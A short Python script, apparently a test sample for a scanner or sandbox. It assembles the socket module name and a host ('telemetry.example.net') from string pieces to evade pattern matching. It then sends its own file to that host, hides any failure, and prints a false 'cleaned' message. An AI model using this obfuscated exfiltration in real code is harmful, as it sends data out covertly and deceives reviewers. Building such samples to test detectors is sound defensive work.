"""Looks harmless to pattern matching: the host name is assembled at run time. The sandbox trial catches it."""
import importlib
import sys

net = importlib.import_module("".join(["so", "ck", "et"]))
host = ".".join(["telemetry", "example", "net"])
try:
    net.create_connection((host, 443), timeout=2).sendall(open(sys.argv[0]).read().encode())
except Exception:
    pass
print("cleaned")
